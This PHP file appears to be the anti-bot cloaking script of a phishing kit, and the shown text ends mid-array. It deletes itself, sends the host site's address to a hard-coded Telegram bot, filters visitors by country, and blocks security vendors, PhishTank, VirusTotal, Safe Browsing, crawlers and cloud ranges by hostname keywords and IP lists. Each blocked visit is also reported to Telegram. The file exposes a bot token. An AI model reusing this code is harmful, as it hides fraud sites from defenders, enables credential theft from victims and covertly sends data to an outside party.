<?php
unlink("antibot.php");
$ddd = $_SERVER['HTTP_HOST'];
$content = "Host: https://".$ddd." [".$adder."]";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
function getTimeZoneFromIpAddress(){
  $clientsIpAddress = get_client_ip();
  $clientInformation = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$clientsIpAddress));
  $clientsLatitude = $clientInformation['geoplugin_latitude'];
  $clientsLongitude = $clientInformation['geoplugin_longitude'];
  $clientsCountryCode = $clientInformation['geoplugin_countryCode'];
  $clientsCountryName = $clientInformation['geoplugin_countryName'];
  $clientsRegionCode = $clientInformation['geoplugin_regionCode'];
  $clientsRegionName = $clientInformation['geoplugin_regionName'];
  $timeZone = get_nearest_timezone($clientsLatitude, $clientsLongitude, $clientsCountryCode) ;
  return array($timeZone, $clientsRegionCode, $clientsRegionName, $clientsCountryName, $clientsCountryCode);
}

$array = getTimeZoneFromIpAddress();

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function get_nearest_timezone($cur_lat, $cur_long, $country_code = '') {
    $timezone_ids = ($country_code) ? DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, $country_code)
        : DateTimeZone::listIdentifiers();

    if($timezone_ids && is_array($timezone_ids) && isset($timezone_ids[0])) {

        $time_zone = '';
        $tz_distance = 0;

        //only one identifier?
        if (count($timezone_ids) == 1) {
            $time_zone = $timezone_ids[0];
        } else {

            foreach($timezone_ids as $timezone_id) {
                $timezone = new DateTimeZone($timezone_id);
                $location = $timezone->getLocation();
                $tz_lat   = $location['latitude'];
                $tz_long  = $location['longitude'];

                $theta    = $cur_long - $tz_long;
                $distance = (sin(deg2rad($cur_lat)) * sin(deg2rad($tz_lat)))
                    + (cos(deg2rad($cur_lat)) * cos(deg2rad($tz_lat)) * cos(deg2rad($theta)));
                $distance = acos($distance);
                $distance = abs(rad2deg($distance));
                // echo '<br />'.$timezone_id.' '.$distance;

                if (!$time_zone || $tz_distance > $distance) {
                    $time_zone   = $timezone_id;
                    $tz_distance = $distance;
                }

            }
        }
        return $time_zone;
    }
    return 'unknown';
}

$IP = get_client_ip();

function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function getOS($useragent) {
  $os_platform = "Unknown OS Platform";
  $os_array = array('/windows nt 10/i' => 'Windows 10','/windows nt 6.3/i' => 'Windows 8.1','/windows nt 6.2/i' => 'Windows 8','/windows nt 6.1/i' => 'Windows 7','/windows nt 6.0/i' => 'Windows Vista','/windows nt 5.2/i' => 'Windows Server 2003/XP x64','/windows nt 5.1/i' => 'Windows XP','/windows xp/i' => 'Windows XP','/windows nt 5.0/i' => 'Windows 2000','/windows me/i' => 'Windows ME','/win98/i' => 'Windows 98','/win95/i' => 'Windows 95','/win16/i' => 'Windows 3.11','/macintosh|mac os x/i' => 'Mac OS X','/mac_powerpc/i' => 'Mac OS 9','/linux/i' => 'Linux','/ubuntu/i' => 'Ubuntu','/iphone/i' => 'iPhone','/ipod/i' => 'iPod','/ipad/i' =>  'iPad','/android/i' => 'Android','/blackberry/i' =>  'BlackBerry','/webos/i' => 'Mobile');
  foreach ($os_array as $regex => $value) {
    if (preg_match($regex, $useragent)) {
      $os_platform = $value;
    }
  }
  return $os_platform;
}

function getBrowser($useragent) {
    $browser = "Unknown Browser";
    $browser_array = array('/msie/i' => 'Internet Explorer','/firefox/i' => 'Firefox','/safari/i' => 'Safari','/chrome/i' => 'Chrome','/opera/i' => 'Opera','/netscape/i' => 'Netscape','/maxthon/i' => 'Maxthon','/konqueror/i' => 'Konqueror','/mobile/i' => 'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

# Variable Section

$details = get_ip1($IP);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$continent = $details['geoplugin_continentName'];
$city = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$currency = $details['geoplugin_currencySymbol_UTF8'];

if($countryname == "") {
    $details = get_ip2($IP2);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode'];
    $continent = $details['continent'];
    $city = $details['city'];
}

$useragentss = $_SERVER['HTTP_USER_AGENT'];
$oss = getOS($useragentss);
$browser = getBrowser($useragentss);

if ($countrycode == "US") {

} elseif ($countrycode == "BD") {

} elseif ($countrycode == "NL") {

} elseif ($countrycode == "CA") {

} elseif ($countrycode == "UK") {

        } else {
        $content = "Bot Found: ".$IP." : ".$countryname." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();

      }  
 

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("teledata-fttx.de","hicoria.com", "simtccflow1.etn.com","above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "msnbot","p3pwgdsn","netcraft","trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler","duckduck","feedfetcher","BitDefender","mcafee","antivirus","cloudflare","p3pwgdsn","avg","avira","avast","ovh.net","security","twitter","bitdefender","virustotal","phising","clamav","baidu","safebrowsing","eset","mailshell","azure","miniature","tlh.ro","aruba","dyn.plus.net","pagepeeker","SPRO-NET-207-70-0","SPRO-NET-209-19-128","vultr","colocrossing.com","geosr","drweb","dr.web","linode.com","opendns",'cymru.com','sl-reverse.com','surriel.com','hosting','orange-labs','speedtravel','metauri','apple.com','bruuk.sk','sysms.net','oracle','cisco','amuri.net',"versanet.de","hilfe-veripayed.com","googlebot.com","upcloud.host","nodemeter.net","e-active.nl","downnotifier","online-domain-tools","fetcher6-2.go.mail.ru","uptimerobot.com","monitis.com","colocrossing.com","majestic12","as9105.com","btcentralplus.com","anonymizing-proxy","digitalcourage.de","triolan.net","staircaseirony","stelkom.net","comrise.ru","kyivstar.net","mpdedicated.com","starnet.md","progtech.ru","hinet.net","is74.ru","shore.net","cyberinfo","ipredator","unknown.telecom.gomel.by","minsktelecom.by","parked.factioninc.com");

    foreach($blocked_words as $word) {
        if (substr_count($hostname, $word) > 0) {

$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();


        }
    }

$bannedIP = array("66.249.91.*","66.249.91.203","^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*","^84.93.84.*","^182.75.120.*","^182.75.120.10","^46.101.43.*","^147.75.210.*");
    if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {

$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();



    } else {
         foreach($bannedIP as $ip) {
              if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";

$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();



              }
         }
    }


    $v_agent = $_SERVER['HTTP_USER_AGENT'];
if($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {

$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();


}
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();


}

$id = $_SERVER['REMOTE_ADDR'];
$ips = array(
"^94.26.*.*", "^95.85.*.*", "^72.52.96.*", "^212.8.79.*", "^62.99.77.*", "^83.31.118.*", "^91.231.*.*", "^206.207.*.*", "^91.231.212.*", "^62.99.77.*", "^198.41.243.*", "^162.158.*.*", "^162.158.7.*", "^162.158.72.*", "^173.245.55.*", "^108.162.246.*", "^162.158.95.*", "^108.162.215.*", "^95.108.194.*", "^141.101.104.*", "^93.54.82.*", "^69.164.145.*", "^194.153.113.*", "^178.43.117.*", "^62.141.65.*", "^83.31.69.*", "^107.178.195.*", "^149.20.54.*", "^85.9.7.*", "^87.106.251.*", "^107.178.194.*", "^124.66.185.*", "^133.11.204.*", "^185.2.138.*", "^188.165.83.*", "^78.148.13.*", "^192.232.213.*", "^1.234.41.*", "^124.66.185.*", "^87.106.251.*", "^176.195.231.*", "^206.253.226.*", "^107.20.181.*", "^188.244.39.*", "^124.66.185.*", "^38.74.138.*", "^124.66.185.*", "^38.74.138.*", "^206.253.226.*", "^1.234.41.*", "^124.66.185.*", "^87.106.251.*", "^85.9.7.*", "^37.140.188.*", "^195.128.227.*", "^38.74.138.*", "^107.20.181.*", "^46.4.120.*", "^107.178.194.*", "^198.60.236.*", "^217.74.103.*", "^92.103.69.*", "^217.74.103.*", "^66.211.160.86*", "^46.244.*.*", "^131.120.12.*", "^157.201.10.*", "^172.217.*.*", "^103.86.99.*", "^213.100.*.*", "^216.58.*.*", "^173.194.*.*", "^74.125.133.*","^66.102.*.*", "^66.249.*.*", "^209.85.*.*", "^216.239.*.*", "^64.4.*.*", "^65.52.*.*", "^131.253.*.*", "^157.54.*.*", "^207.46.*.*", "^207.68.*.*", "^8.12.*.*", "^66.196.*.*", "^66.228.*.*", "^67.195.*.*", "^68.142.*.*", "^72.30.*.*", "^74.6.*.*", "^98.136.*.*", "^202.160.*.*", "^209.191.*.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*","^184.165.*.*","^198.68.61.*","^199.3.10.*","^204.119.24.*","^204.251.90.*","^100.43.*.*","^72.94.249.*","^103.6.76.*","^106.12.*.*","^115.231.36.*","^5.189.*.*","^66.102.6.*","^66.249.*.*","^173.252.*.*","^196.23.168.*","^190.82.81.*","^92.189.25.*","^52.31.147.*","^69.164.111.*","^173.252.86.*","^173.239.*.*","^203.215.181.*","^208.43.225.*","^173.192.*.*","^212.113.37.*","^119.63.*.*","^188.207.200.*","^89.108.102.*","^173.11.97.*","^209.185.108.*",
    "^209.185.253.*","^216.239.*.*","^64.68.*.*","^66.249.*.*","^72.14.199.*","^8.6.48.*","^141.185.209.*","^169.207.238.*","^202.160.*.*","^195.211.*.*","^185.41.162.*","^51.15.*.*","^84.51.153.*","^185.220.101.*","^40.85.158.*","^72.94.249.*","^8.23.224.*","^104.132.20.*","^1.33.126.*","^217.96.*.*","^64.233.160.*","^93.119.*.*","^23.27.152.*","^111.231.*.*","^144.217.82.*","^148.163.128.*","^41.208.72.*","^36.74.236.*","^64.233.173.*","^36.83.56.*","^87.115.213.*","^110.88.*.*","^46.101.119.*","^87.115.213.*","^68.14.83.*","^100.6.107.*","^174.255.*.*","^72.49.133.*","^104.15.60.*","^35.153.86.*","^191.98.136.*","^175.135.172.*","^134.119.*.*","^208.101.*.*","^104.42.*.*","^181.229.*.*","^89.234.*.*","^186.6.*.*","^103.19.16.*","^158.69.216.*","^157.39.109.*","^83.31.*.*","^92.23.56.*","^86.132.235.*","^106.133.165.*","^111.89.*.*","^14.101.178.*","^107.178.*.*","^180.29.89.*","^61.21.221.*","^204.85.191.*","^188.166.*.*","^103.19.16.*","^199.59.150.*","^209.135.212.*","^208.87.233.*","^83.31.*.*","^49.104.10.*","^216.252.*.*","^24.172.*.*","^193.128.*.*","^162.244.*.*","^40.121.198.*","^95.45.252.*","^188.166.*.*","^83.71.*.*","^66.214.*.*","^205.201.132.*","^40.107.*.*","^104.132.*.*","^173.205.33.*","^185.145.156.*","^17.198.249.*","^103.35.*.*","^128.28.*.*","^128.72.*.*","^128.75.*.*","^138.122.*.*","^139.59.*.*","^50.107.*.*","^66.102.*.*", "^38.100.*.*", "^107.170.*.*",
 "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*",
 "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*",
"^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*",
 "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*",
 "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*",
 "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*",
 "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*",
 "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*",
 "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*",
 "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*",
 "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*",
 "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*",
"^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*",
"^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*",
"^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*",
 "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*",
"^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*",
 "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*",
 "^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171",
"^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*",
"^104.108.64.175","104.83.233.198", "^173.194.116.102","^173.194.112.*",
"^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*",
"^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152",
"^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119",
"^65.55.92.184", "^65.54.188.126","^65.55.37.88", "^65.55.37.88", "^65.55.92.136",
"^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104",
"^65.54.188.110", "^65.55.37.72", "^65.55.92.152", "^207.46.8.167", "^65.55.33.135",
"^134.170.2.199", "^65.55.85.12", "^173.194.116.149", "^216.58.211.37" ,
"^89.163.159.214", "^64.233.*.*", "^66.102.*.*", "^66.249.*.*", "^216.239.*.*" , "^216.33.229.163" ,
"^64.233.173.*" , "^64.68.90.*",
"^66.102.*.*",
     "^38.100.*.*",
     "^107.170.*.*",
     "^149.20.*.*",
     "^38.105.*.*",
     "^74.125.*.*",
     "^66.150.14.*",
     "^54.176.*.*",
     "^38.100.*.*",
     "^184.173.*.*",
     "^66.249.*.*",
     "^128.242.*.*",
     "^72.14.192.*",
     "^208.65.144.*",
     "^74.125.*.*",
     "^209.85.128.*",
     "^216.239.32.*",
     "^74.125.*.*",
     "^207.126.144.*",
     "^173.194.*.*",
     "^64.233.160.*",
     "^72.14.192.*",
     "^66.102.*.*",
     "^64.18.*.*",
     "^194.52.68.*",
     "^194.72.238.*",
     "^62.116.207.*",
     "^212.50.193.*",
     "^69.65.*.*",
     "^50.7.*.*",
     "^131.212.*.*",
     "^46.116.*.* ",
     "^62.90.*.*",
     "^89.138.*.*",
     "^82.166.*.*",
     "^85.64.*.*",
     "^85.250.*.*",
     "^89.138.*.*",
     "^93.172.*.*",
     "^109.186.*.*",
     "^194.90.*.*",
     "^212.29.192.*",
     "^212.29.224.*",
     "^212.143.*.*",
     "^212.150.*.*",
     "^212.235.*.*",
     "^217.132.*.*",
     "^50.97.*.*",
     "^217.132.*.*",
     "^209.85.*.*",
     "^66.205.64.*",
     "^204.14.48.*",
     "^64.27.2.*",
     "^67.15.*.*",
     "^202.108.252.*",
     "^193.47.80.*",
     "^64.62.136.*",
     "^66.221.*.*",
     "^64.62.175.*",
     "^198.54.*.*",
     "^192.115.134.*",
     "^216.252.167.*",
     "^193.253.199.*",
     "^69.61.12.*",
     "^64.37.103.*",
     "^38.144.36.*",
     "^64.124.14.*",
     "^206.28.72.*",
     "^209.73.228.*",
     "^158.108.*.*",
     "^168.188.*.*",
     "^66.207.120.*",
     "^167.24.*.*",
     "^192.118.48.*",
     "^67.209.128.*",
     "^12.148.209.*",
     "^12.148.196.*",
     "^193.220.178.*",
     "68.65.53.71",
     "^198.25.*.*",
     "^64.106.213.*",
     "^54.228.218.117",
     "^54.228.218.*",
     "^185.28.20.243",
     "^185.28.20.*",
     "^217.16.26.166",
     "^217.16.26.*
